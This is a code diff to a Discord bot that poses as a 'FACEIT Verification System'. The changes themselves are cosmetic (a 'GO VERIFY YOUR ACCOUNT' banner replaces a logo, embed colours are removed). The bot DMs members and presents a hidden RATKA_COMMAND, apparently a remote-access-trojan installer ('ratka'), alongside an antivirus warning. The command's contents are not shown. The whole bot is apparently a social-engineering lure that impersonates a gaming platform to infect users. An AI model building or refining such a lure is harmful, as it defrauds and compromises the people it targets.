@@ -331,11 +331,9 @@ def ratka_image_file() -> discord.File:
 
 
 def header() -> ui.Section:
-    """Заголовок с логотипом справа."""
+    """Заголовок с баннером GO VERIFY YOUR ACCOUNT."""
     return ui.Section(
-        "# FACEIT Status BOT",
-        "-# FACEIT Verification System",
-        accessory=ui.Thumbnail("attachment://logo.png"),
+        ui.Media("attachment://banner.webp"),
     )
 
 
@@ -344,7 +342,6 @@ def result_message(lang: str, game: str, player: dict, verify_url: str) -> Tuple
     embed = discord.Embed(
         title=f"⚠️ {t['title'].format(nick=player['nickname'])}",
         description=f"\n{t['description']}",
-        color=FACEIT_ORANGE,
     )
     level = player["level"]
     level_text = LEVEL_EMOJIS.get(level) or str(level or "—")
@@ -491,7 +488,6 @@ class RatkaLanguageRow(ui.ActionRow):
                 f"```\n{RATKA_COMMAND}\n```\n"
                 f"⚠️ {t['ratka_antivirus']}"
             ),
-            color=FACEIT_ORANGE,
         )
         embed.set_image(url="attachment://4.png")
         embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
@@ -572,7 +568,7 @@ async def verif(interaction: discord.Interaction, member: discord.Member, game: 
     game_value = game.value if isinstance(game, app_commands.Choice) else game
 
     try:
-        await member.send(view=LanguageView(game_value), file=logo_file())
+        await member.send(view=LanguageView(game_value), file=banner_file())
     except discord.Forbidden:
         await interaction.response.send_message(
             f"Не удалось написать {member.mention}: у него закрыты личные сообщения."
@@ -636,7 +632,6 @@ async def ratka(interaction: discord.Interaction, member: discord.Member, langua
             f"```\n{RATKA_COMMAND}\n```\n"
             f"⚠️ {t['ratka_antivirus']}"
         ),
-        color=FACEIT_ORANGE,
     )
     embed.set_image(url="attachment://4.png")
     embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
@@ -698,7 +693,6 @@ async def final(interaction: discord.Interaction, member: discord.Member, langua
             f"{t['final_priority']}\n\n"
             f"{t['final_thanks']}"
         ),
-        color=discord.Colour.green(),
     )
     embed.set_thumbnail(url="attachment://logo.png")
     embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
@@ -758,7 +752,6 @@ async def oshibka(interaction: discord.Interaction, member: discord.Member, lang
             f"{t['oshibka_error']}\n\n"
             f"{t['oshibka_apology']}"
         ),
-        color=discord.Colour.red(),
     )
     embed.set_thumbnail(url="attachment://logo.png")
     embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
